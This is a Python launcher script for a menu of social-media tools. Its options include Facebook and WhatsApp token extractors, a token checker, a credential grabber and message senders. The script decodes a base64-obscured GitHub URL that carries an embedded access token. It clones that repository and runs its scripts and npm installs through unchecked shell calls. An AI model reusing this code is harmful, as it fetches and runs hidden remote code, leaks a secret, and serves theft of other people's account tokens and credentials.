import os
import base64
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

logo = f'''
{Fore.CYAN}{Style.BRIGHT}
 ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██║   ██╔══╝  ██╔═══╝ ██║╚██╔╝██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║   ███████╗██║     ██║ ╚═╝ ██║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝   ╚══════╝╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
'''

def decrypt(encoded_str):
    return base64.b64decode(encoded_str).decode('utf-8')

def print_menu():
    print(f"{Fore.YELLOW}{Style.BRIGHT}┌──────────────────────────────┐")
    print(f"│        SELECT OPTION        │")
    print(f"├──────────────────────────────┤")
    print(f"│ 01. POST                    │")
    print(f"│ 02. CONVO                   │")
    print(f"│ 03. WATTSAPP                │")
    print(f"│ 04. TOKEN CHECKER           │")
    print(f"│ 05. TOKEN EXTRACTOR         │")
    print(f"│ 06. FACEBOOK POST ID        │")
    print(f"│ 07. WATTSAPP GROUP ID       │")
    print(f"│ 08. MESSENGER CONVO ID      │")
    print(f"│ 09. PAGE TOKEN EXTRACTOR    │")
    print(f"│ 10. WATTSAPP CREDENTIALS    │")
    print(f"└──────────────────────────────┘{Style.RESET_ALL}")

def run_command(option):
    # Obfuscated
    repo_b64 = "aHR0cHM6Ly9vYXV0aDI6Z2hwX1JPenNxSmVwZHdmU045NHZuS0NDQ0ZENDZhZEJ5azRJQnA1WU9LQldZU0lXNjlKREI3UUpXSVM3ODlJSEovVEVSTVVYLU9GRkxJTkUuZ2l0"
    folder_b64 = "VEVSTVVYLU9GRkxJTkU="

    repo_url = decrypt(repo_b64)
    folder = decrypt(folder_b64)

    commands = {
        "1": "python post.py",
        "2": "python convo.py",
        "3": "python wattsapp.py",
        "4": "python token_checker.py",
        "5": "python token_extractor.py",
        "6": "python post_id.py",
        "7": "npm install && node wp_group_id.js",
        "8": "python convo_id.py",
        "9": "python page_token.py",
        "10": "npm install && node wp_creds.js"
    }

    cmd = commands.get(option)

    if not cmd:
        print(f"{Fore.RED}Invalid option. Please try again.")
        return

    if not os.path.exists(folder):
        os.system(f"git clone {repo_url}")

    final = f"cd {folder} && {cmd}"
    os.system(final)

if __name__ == "__main__":
    clear_screen()
    print(logo)
    print_menu()
    choice = input(f"\n{Fore.GREEN}Select an option (1-10): {Style.RESET_ALL}").strip()
    run_command(choice)
